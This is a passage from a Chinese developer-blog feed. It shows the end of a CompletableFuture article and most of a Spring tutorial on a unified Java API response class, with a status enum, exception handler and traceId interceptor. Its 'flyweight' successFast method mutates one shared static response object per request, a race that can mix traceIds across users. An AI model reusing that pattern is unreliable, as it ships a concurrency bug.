<ul>
<li>异步任务里的异常，主线程是感知不到的（除非调用 get/join）。务必使用 exceptionally 或 handle 进行兜底。</li>
</ul>
</li>
<li>
<p><strong>get() vs join()</strong> ：</p>
<ul>
<li>get() 抛出检查异常（需要 try-catch）。</li>
<li>join() 抛出运行时异常（代码更简洁，配合 Stream 流使用更爽）。</li>
</ul>
</li>
</ol>
<h2 data-id="heading-8">📝 总结</h2>








































<table><thead><tr><th>方法</th><th>作用</th><th>场景</th></tr></thead><tbody><tr><td>supplyAsync</td><td>开启异步任务</td><td>任务起点</td></tr><tr><td>thenApply</td><td>拿到上一步结果，处理并返回新结果</td><td>串行转换 (map)</td></tr><tr><td>thenAccept</td><td>拿到上一步结果，处理但不返回</td><td>串行消费 (void)</td></tr><tr><td>allOf</td><td>等待所有任务完成</td><td>并行聚合</td></tr><tr><td>anyOf</td><td>只要有一个任务完成就返回</td><td>赛马模式 (谁快用谁)</td></tr><tr><td>exceptionally</td><td>处理异常</td><td>兜底降级</td></tr></tbody></table>
<p>掌握了 CompletableFuture，你的代码不仅跑得快，而且逻辑清晰，维护性强。赶紧去优化你项目里的慢接口吧！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从零封装一个通用的 API 接口返回类：统一前后端交互格式]]></title>    <link>https://juejin.cn/post/7592944032773668915</link>    <guid>https://juejin.cn/post/7592944032773668915</guid>    <pubDate>2026-01-09T06:28:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592944032773668915" data-draft-id="7592997693069525002" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从零封装一个通用的 API 接口返回类：统一前后端交互格式"/> <meta itemprop="keywords" content="Java,设计模式"/> <meta itemprop="datePublished" content="2026-01-09T06:28:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="帅气的你"/> <meta itemprop="url" content="https://juejin.cn/user/1626932940649534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从零封装一个通用的 API 接口返回类：统一前后端交互格式
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1626932940649534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    帅气的你
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T06:28:25.000Z" title="Fri Jan 09 2026 06:28:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">从零封装一个通用的 API 接口返回类：统一前后端交互格式</h2>
<h3 data-id="heading-1">一、开篇：那些年，我们被混乱的返回格式折磨的日子</h3>
<p>想象一下这样的场景：前端小哥小王正在对接后端接口，第一个接口返回 <code>{"data": {...}}</code>，第二个接口返回 <code>{"result": {...}}</code>，第三个接口直接返回数组 <code>[{...}]</code>，第四个接口出错时返回 <code>{"error": "xxx"}</code>，第五个接口成功时返回 <code>{"success": true}</code>...</p>
<p>小王崩溃了："每个接口返回格式都不一样，我到底该怎么统一处理？"</p>
<p>这就是<strong>没有统一返回格式</strong>的典型问题：<strong>沟通成本高、调试麻烦、代码重复、维护困难</strong>。就像每个餐厅的菜单格式都不一样，点个菜都要重新学习一遍，效率自然低。</p>
<p><strong>解决方案很简单：封装一个通用的 API 返回类，让所有接口都遵循同一套"语言规则"</strong>。</p>
<h3 data-id="heading-2">二、通用返回类的"四件套"：状态码、消息、数据、时间戳</h3>
<p>一个通用的 API 返回类，就像快递包裹上的标签，需要包含以下核心信息：</p>






























<table><thead><tr><th>组成部分</th><th>作用</th><th>比喻</th></tr></thead><tbody><tr><td><strong>状态码（code）</strong></td><td>标识请求成功或失败</td><td>就像快递单上的"已签收"或"派送中"</td></tr><tr><td><strong>消息（message）</strong></td><td>给前端展示的提示信息</td><td>就像快递单上的备注说明</td></tr><tr><td><strong>数据（data）</strong></td><td>实际返回的业务数据</td><td>就像包裹里的实际物品</td></tr><tr><td><strong>时间戳（timestamp）</strong></td><td>记录响应时间</td><td>就像快递单上的时间戳</td></tr></tbody></table>
<h3 data-id="heading-3">三、从零开始封装：基础版本</h3>
<h4 data-id="heading-4">第一步：状态码枚举化——告别魔法值</h4>
<p><strong>问题：</strong> 代码里写 <code>200</code>、<code>500</code> 这些数字，就像用"暗号"交流，别人看不懂，自己过几天也忘了。</p>
<p><strong>解决方案：</strong> 用枚举类定义状态码，就像制作一本"标准化字典"，所有状态码一目了然：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 响应状态码枚举
 * 就像"标准化字典"，统一管理所有状态码
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">ResponseCodeEnum</span> {
    SUCCESS(<span class="hljs-number">200</span>, <span class="hljs-string">"操作成功"</span>),
    PARAM_ERROR(<span class="hljs-number">400</span>, <span class="hljs-string">"参数错误"</span>),
    UNAUTHORIZED(<span class="hljs-number">401</span>, <span class="hljs-string">"未授权"</span>),
    FORBIDDEN(<span class="hljs-number">403</span>, <span class="hljs-string">"无权限"</span>),
    NOT_FOUND(<span class="hljs-number">404</span>, <span class="hljs-string">"资源不存在"</span>),
    SERVER_ERROR(<span class="hljs-number">500</span>, <span class="hljs-string">"系统异常"</span>);
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Integer code;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String message;
    
    ResponseCodeEnum(Integer code, String message) {
        <span class="hljs-built_in">this</span>.code = code;
        <span class="hljs-built_in">this</span>.message = message;
    }
    
    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getCode</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> code;
    }
    
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMessage</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> message;
    }
}
</code></pre>
<h4 data-id="heading-5">第二步：用 Lombok 简化代码——告别样板代码</h4>
<p><strong>问题：</strong> 写 Getter/Setter、构造方法太繁琐，就像每次点餐都要重复说"我要这个，不要那个"。</p>
<p><strong>解决方案：</strong> 用 Lombok 的 <code>@Data</code> 和 <code>@Builder</code>，就像餐厅的"一键下单"：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> lombok.Builder;
<span class="hljs-keyword">import</span> com.fasterxml.jackson.annotation.JsonInclude;
<span class="hljs-keyword">import</span> java.time.LocalDateTime;
<span class="hljs-keyword">import</span> java.time.format.DateTimeFormatter;
<span class="hljs-keyword">import</span> java.util.Collections;

<span class="hljs-comment">/**
 * 通用 API 返回类
 * <span class="hljs-doctag">@param</span> &lt;T&gt; 返回数据的类型，可以是任意类型（User、List、Map 等）
 */</span>
<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Builder</span>
<span class="hljs-meta">@JsonInclude(JsonInclude.Include.NON_NULL)</span> <span class="hljs-comment">// 忽略 null 字段，减少数据体积</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApiResponse</span>&lt;T&gt; {
    <span class="hljs-comment">/**
     * 状态码：使用枚举，避免魔法值
     */</span>
    <span class="hljs-keyword">private</span> Integer code;
    
    <span class="hljs-comment">/**
     * 提示信息：给前端展示的消息
     */</span>
    <span class="hljs-keyword">private</span> String message;
    
    <span class="hljs-comment">/**
     * 返回数据：可以是任意类型，用泛型 T 表示
     */</span>
    <span class="hljs-keyword">private</span> T data;
    
    <span class="hljs-comment">/**
     * 时间戳（毫秒）：用于日志记录
     */</span>
    <span class="hljs-keyword">private</span> Long timestamp;
    
    <span class="hljs-comment">/**
     * 格式化时间：前端直接展示，无需转换
     * 就像快递单上的"2024-01-01 12:00:00"，比时间戳更友好
     */</span>
    <span class="hljs-keyword">private</span> String formattedTime;
    
    <span class="hljs-comment">/**
     * 链路追踪 ID：微服务场景下，通过 traceId 串联整个请求链路
     * 就像快递单号，可以追踪包裹的完整流转路径
     */</span>
    <span class="hljs-keyword">private</span> String traceId;
    
    <span class="hljs-comment">/**
     * 成功返回（带数据）
     * 就像餐厅的"标准套餐"
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; ApiResponse&lt;T&gt; <span class="hljs-title function_">success</span><span class="hljs-params">(T data)</span> {
        <span class="hljs-keyword">return</span> buildResponse(ResponseCodeEnum.SUCCESS, data);
    }
    
    <span class="hljs-comment">/**
     * 成功返回（不带数据）
     * 就像餐厅的"简餐"
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; ApiResponse&lt;T&gt; <span class="hljs-title function_">success</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> buildResponse(ResponseCodeEnum.SUCCESS, <span class="hljs-literal">null</span>);
    }
    
    <span class="hljs-comment">/**
     * 成功返回（自定义消息）
     * 就像餐厅的"定制套餐"
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; ApiResponse&lt;T&gt; <span class="hljs-title function_">success</span><span class="hljs-params">(String message, T data)</span> {
        <span class="hljs-keyword">return</span> ApiResponse.&lt;T&gt;builder()
                .code(ResponseCodeEnum.SUCCESS.getCode())
                .message(message)
                .data(data)
                .timestamp(System.currentTimeMillis())
                .formattedTime(LocalDateTime.now().format(DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>)))
                .traceId(getTraceId())
                .build();
    }
    
    <span class="hljs-comment">/**
     * 失败返回（使用枚举）
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; ApiResponse&lt;T&gt; <span class="hljs-title function_">error</span><span class="hljs-params">(ResponseCodeEnum codeEnum)</span> {
        <span class="hljs-keyword">return</span> buildResponse(codeEnum, <span class="hljs-literal">null</span>);
    }
    
    <span class="hljs-comment">/**
     * 失败返回（自定义消息）
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; ApiResponse&lt;T&gt; <span class="hljs-title function_">error</span><span class="hljs-params">(String message)</span> {
        <span class="hljs-keyword">return</span> ApiResponse.&lt;T&gt;builder()
                .code(ResponseCodeEnum.SERVER_ERROR.getCode())
                .message(message)
                .data(<span class="hljs-literal">null</span>)
                .timestamp(System.currentTimeMillis())
                .formattedTime(LocalDateTime.now().format(DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>)))
                .traceId(getTraceId())
                .build();
    }
    
    <span class="hljs-comment">/**
     * 失败返回（自定义状态码和消息）
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; ApiResponse&lt;T&gt; <span class="hljs-title function_">error</span><span class="hljs-params">(Integer code, String message)</span> {
        <span class="hljs-keyword">return</span> ApiResponse.&lt;T&gt;builder()
                .code(code)
                .message(message)
                .data(<span class="hljs-literal">null</span>)
                .timestamp(System.currentTimeMillis())
                .formattedTime(LocalDateTime.now().format(DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>)))
                .traceId(getTraceId())
                .build();
    }
    
    <span class="hljs-comment">/**
     * 空数据友好返回：避免前端 null 指针问题
     * 就像餐厅的"空盘子"也要标注清楚，避免客人误以为没上菜
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; ApiResponse&lt;T&gt; <span class="hljs-title function_">successEmpty</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> ApiResponse.&lt;T&gt;builder()
                .code(ResponseCodeEnum.SUCCESS.getCode())
                .message(<span class="hljs-string">"操作成功"</span>)
                .data((T) Collections.emptyList()) <span class="hljs-comment">// 返回空集合而非 null</span>
                .timestamp(System.currentTimeMillis())
                .formattedTime(LocalDateTime.now().format(DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>)))
                .traceId(getTraceId())
                .build();
    }
    
    <span class="hljs-comment">/**
     * 统一构建响应对象
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> &lt;T&gt; ApiResponse&lt;T&gt; <span class="hljs-title function_">buildResponse</span><span class="hljs-params">(ResponseCodeEnum codeEnum, T data)</span> {
        <span class="hljs-keyword">return</span> ApiResponse.&lt;T&gt;builder()
                .code(codeEnum.getCode())
                .message(codeEnum.getMessage())
                .data(data)
                .timestamp(System.currentTimeMillis())
                .formattedTime(LocalDateTime.now().format(DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>)))
                .traceId(getTraceId())
                .build();
    }
    
    <span class="hljs-comment">/**
     * 获取链路追踪 ID（从 MDC 中获取）
     * MDC 就像"线程级别的全局变量"，可以在整个请求链路中传递 traceId
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getTraceId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> org.slf4j.MDC.get(<span class="hljs-string">"traceId"</span>);
    }
}
</code></pre>
<h3 data-id="heading-6">四、性能优化：享元模式预创建高频对象</h3>
<p><strong>问题：</strong> 每次调用都创建新对象，就像每次点餐都要重新做菜单，浪费资源。</p>
<p><strong>解决方案：</strong> 用享元模式预创建高频响应对象，就像餐厅提前准备好"标准套餐"，直接上菜：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApiResponse</span>&lt;T&gt; {
    <span class="hljs-comment">// ... 上面的代码</span>
    
    <span class="hljs-comment">/**
     * 预创建的高频响应对象（享元模式）
     * 就像餐厅提前准备好的"标准套餐"，直接上菜，无需现做
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ApiResponse&lt;Object&gt; SUCCESS_EMPTY = 
            ApiResponse.builder()
                    .code(ResponseCodeEnum.SUCCESS.getCode())
                    .message(ResponseCodeEnum.SUCCESS.getMessage())
                    .data(<span class="hljs-literal">null</span>)
                    .timestamp(System.currentTimeMillis())
                    .formattedTime(LocalDateTime.now().format(DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>)))
                    .traceId(getTraceId())
                    .build();
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> ApiResponse&lt;Object&gt; SERVER_ERROR = 
            ApiResponse.builder()
                    .code(ResponseCodeEnum.SERVER_ERROR.getCode())
                    .message(ResponseCodeEnum.SERVER_ERROR.getMessage())
                    .data(<span class="hljs-literal">null</span>)
                    .timestamp(System.currentTimeMillis())
                    .formattedTime(LocalDateTime.now().format(DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>)))
                    .traceId(getTraceId())
                    .build();
    
    <span class="hljs-comment">/**
     * 复用预创建对象（注意：需要更新 timestamp 和 traceId）
     */</span>
    <span class="hljs-meta">@SuppressWarnings("unchecked")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; ApiResponse&lt;T&gt; <span class="hljs-title function_">successFast</span><span class="hljs-params">()</span> {
        ApiResponse&lt;Object&gt; response = SUCCESS_EMPTY;
        response.setTimestamp(System.currentTimeMillis());
        response.setFormattedTime(LocalDateTime.now().format(DateTimeFormatter.ofPattern(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>)));
        response.setTraceId(getTraceId());
        <span class="hljs-keyword">return</span> (ApiResponse&lt;T&gt;) response;
    }
}
</code></pre>
<h3 data-id="heading-7">五、全局异常处理：优雅处理各种异常</h3>
<h4 data-id="heading-8">业务异常类</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * 业务异常类
 * 就像餐厅的"退单理由"，统一管理业务异常
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BusinessException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RuntimeException</span> {
    <span class="hljs-keyword">private</span> Integer code;
    <span class="hljs-keyword">private</span> String message;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BusinessException</span><span class="hljs-params">(ResponseCodeEnum codeEnum)</span> {
        <span class="hljs-built_in">this</span>.code = codeEnum.getCode();
        <span class="hljs-built_in">this</span>.message = codeEnum.getMessage();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BusinessException</span><span class="hljs-params">(Integer code, String message)</span> {
        <span class="hljs-built_in">this</span>.code = code;
        <span class="hljs-built_in">this</span>.message = message;
    }
    
    <span class="hljs-comment">// Getter 方法</span>
    <span class="hljs-keyword">public</span> Integer <span class="hljs-title function_">getCode</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> code;
    }
    
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMessage</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> message;
    }
}
</code></pre>
<h4 data-id="heading-9">全局异常处理器</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.validation.BindException;
<span class="hljs-keyword">import</span> org.springframework.web.bind.MethodArgumentNotValidException;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ExceptionHandler;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestControllerAdvice;
<span class="hljs-keyword">import</span> org.slf4j.Logger;
<span class="hljs-keyword">import</span> org.slf4j.LoggerFactory;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

<span class="hljs-comment">/**
 * 全局异常处理器
 * 就像餐厅的"统一客服"，不管什么问题都按标准流程处理
 */</span>
<span class="hljs-meta">@RestControllerAdvice</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalExceptionHandler</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(GlobalExceptionHandler.class);
    
    <span class="hljs-comment">/**
     * 捕获业务异常
     */</span>
    <span class="hljs-meta">@ExceptionHandler(BusinessException.class)</span>
    <span class="hljs-keyword">public</span> ApiResponse&lt;Object&gt; <span class="hljs-title function_">handleBusinessException</span><span class="hljs-params">(BusinessException e)</span> {
        logger.warn(<span class="hljs-string">"业务异常：{}"</span>, e.getMessage());
        <span class="hljs-keyword">return</span> ApiResponse.error(e.getCode(), e.getMessage());
    }
    
    <span class="hljs-comment">/**
     * 捕获参数校验异常
     */</span>
    <span class="hljs-meta">@ExceptionHandler({MethodArgumentNotValidException.class, BindException.class})</span>
    <span class="hljs-keyword">public</span> ApiResponse&lt;Object&gt; <span class="hljs-title function_">handleValidationException</span><span class="hljs-params">(Exception e)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">"参数校验失败"</span>;
        <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">instanceof</span> MethodArgumentNotValidException) {
            <span class="hljs-type">MethodArgumentNotValidException</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> (MethodArgumentNotValidException) e;
            message = ex.getBindingResult().getFieldError().getDefaultMessage();
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (e <span class="hljs-keyword">instanceof</span> BindException) {
            <span class="hljs-type">BindException</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> (BindException) e;
            message = ex.getBindingResult().getFieldError().getDefaultMessage();
        }
        <span class="hljs-keyword">return</span> ApiResponse.error(ResponseCodeEnum.PARAM_ERROR.getCode(), message);
    }
    
    <span class="hljs-comment">/**
     * 捕获所有异常（生产环境隐藏异常详情）
     */</span>
    <span class="hljs-meta">@ExceptionHandler(Exception.class)</span>
    <span class="hljs-keyword">public</span> ApiResponse&lt;Object&gt; <span class="hljs-title function_">handleException</span><span class="hljs-params">(Exception e)</span> {
        logger.error(<span class="hljs-string">"系统异常"</span>, e);
        <span class="hljs-comment">// 生产环境隐藏异常详情，避免泄露敏感信息</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> isProduction() ? <span class="hljs-string">"系统异常，请联系管理员"</span> : e.getMessage();
        <span class="hljs-keyword">return</span> ApiResponse.error(ResponseCodeEnum.SERVER_ERROR.getCode(), message);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isProduction</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 根据实际环境判断</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"prod"</span>.equals(System.getProperty(<span class="hljs-string">"spring.profiles.active"</span>));
    }
}
</code></pre>
<h3 data-id="heading-10">六、链路追踪配置：MDC 拦截器</h3>
<p><strong>问题：</strong> 微服务场景下，一个请求可能经过多个服务，如何追踪整个链路？</p>
<p><strong>解决方案：</strong> 用 MDC（Mapped Diagnostic Context）传递 traceId，就像快递单号，可以追踪整个流转路径：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.slf4j.MDC;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;
<span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> java.util.UUID;

<span class="hljs-comment">/**
 * 链路追踪拦截器
 * 就像给每个快递包裹贴上"追踪单号"
 */</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TraceInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TRACE_ID</span> <span class="hljs-operator">=</span> <span class="hljs-string">"traceId"</span>;
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> {
        <span class="hljs-comment">// 从请求头获取 traceId，如果没有则生成新的</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">traceId</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">"X-Trace-Id"</span>);
        <span class="hljs-keyword">if</span> (traceId == <span class="hljs-literal">null</span> || traceId.isEmpty()) {
            traceId = UUID.randomUUID().toString().replace(<span class="hljs-string">"-"</span>, <span class="hljs-string">""</span>);
        }
        <span class="hljs-comment">// 存入 MDC，后续所有日志和响应都会带上这个 traceId</span>
        MDC.put(TRACE_ID, traceId);
        <span class="hljs-comment">// 响应头也返回 traceId，方便前端追踪</span>
        response.setHeader(<span class="hljs-string">"X-Trace-Id"</span>, traceId);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> {
